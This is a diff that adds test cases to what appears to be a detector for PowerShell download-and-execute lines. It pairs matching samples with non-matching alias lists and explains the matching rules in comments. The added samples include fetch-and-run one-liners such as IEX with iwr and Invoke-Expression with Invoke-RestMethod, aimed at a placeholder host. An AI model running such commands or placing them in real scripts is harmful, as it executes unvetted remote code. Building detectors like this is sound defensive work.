@@ -534,6 +534,31 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"iex (irm https://example.invalid/x)\n",
             b"irm https://example.invalid/api | ConvertFrom-Json\n",
         ),
+        # iex before the download needs an argument: something other than list words between
+        # the two. An alphabetical list of aliases or cmdlets puts iex ahead of irm and iwr
+        # with only words between them, as the alias table of a PowerShell lexer does.
+        (
+            "script_download_execute",
+            b'IEX   "$(iwr -useb https://example.invalid/x)"\n',
+            b"        'h history icm iex ihy ii ipal ipcsv ipmo ipsn irm ise iwmi iwr kill lp '\n",
+        ),
+        (
+            "script_download_execute",
+            b"Invoke-Expression -Command (Invoke-RestMethod https://example.invalid/x)\n",
+            b"Invoke-Expression Invoke-History Invoke-Item Invoke-RestMethod Invoke-WebRequest\n",
+        ),
+        # A word glued to the subexpression is one argument, and any other byte between the two
+        # that is not a list word keeps the match. iex with a bare word and nothing else is not one.
+        (
+            "script_download_execute",
+            b"iex a$(irm https://example.invalid/x)\n",
+            b"iex irm\n",
+        ),
+        (
+            "script_download_execute",
+            b"iex ihy irm ise $(iwr https://example.invalid/x)\n",
+            b"Get-Alias iex, ihy | Format-Table\nGet-Alias irm, iwr | Format-Table\n",
+        ),
         # A documentary phrase exempts only the command its own line, or the line above, covers.
         (
             "script_download_execute",
